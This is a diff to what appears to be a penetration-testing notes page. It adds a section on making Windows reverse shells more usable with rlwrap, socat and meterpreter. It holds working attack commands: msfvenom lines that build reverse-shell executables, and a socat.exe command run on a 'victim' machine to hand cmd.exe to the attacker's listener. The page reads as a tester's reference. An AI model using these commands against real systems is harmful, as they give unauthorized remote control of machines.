@@ -91,6 +91,45 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reve
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
 
+## Improving Windows Reverse Shells
+
+Usually, after catching a reverse shell from a Windows machine through netcat you already have a shell that has full functionality. However, on occasion your shell is limited in some ways that can be truly annoying.  The features I miss the most are command history (and using the 'up' and 'down' arrows to cycle through them) and tab autocompletion.  It can feel quite disorienting working in a shell that is missing these vital features.
+ 
+Options for upgrading Windows reverse shells are more limited than they are coming from a Linux machine.  
+
+### rlwrap
+
+You can mitigate some of the restrictions of poor netcat shells by wrapping the netcat listener with the `rlwrap` command.  This is not installed in Kali Linux by default so you will need to install it using the command `sudo apt install rlwrap -y`.  Other distributions may or may not have this installed or available in their package manager.
+
+```bash
+rlwrap nc -lvnp $port
+```
+
+Start your netcat listener by first prefixing it with the `rlwrap` command, then specifying the port to listen on.  Your shell will automatically be a bit more stable than running netcat by itself.
+
+### socat 
+
+Another powerful tool that can be used to get functional shells, do port forwarding, and much more is [`socat`](http://www.dest-unreach.org/socat/).  (Windows version: [https://github.com/3ndG4me/socat](https://github.com/3ndG4me/socat))
+
+1. From your attack platform create a listener
+
+```bash
+socat TCP4-LISTEN:$port,fork STDOUT
+```
+
+2. Upload to or compile `socat.exe` on the Windows victim machine.
+
+3. On the Windows victim create the reverse shell back to your waiting listener.
+
+```bash
+socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes
+```
+
+### meterpreter
+
+Another method of upgrading the functionality of a Windows reverse shell that I know is to create a reverse shell payload that calls a `meterpreter` interactive shell.  This shell interacts with the Metasploit Framework to provide additional functionality such as uploading and downloading files, attempting to elevate privileges to System, and more.
+
+
 ## netsh port forwarding
 
 ```text
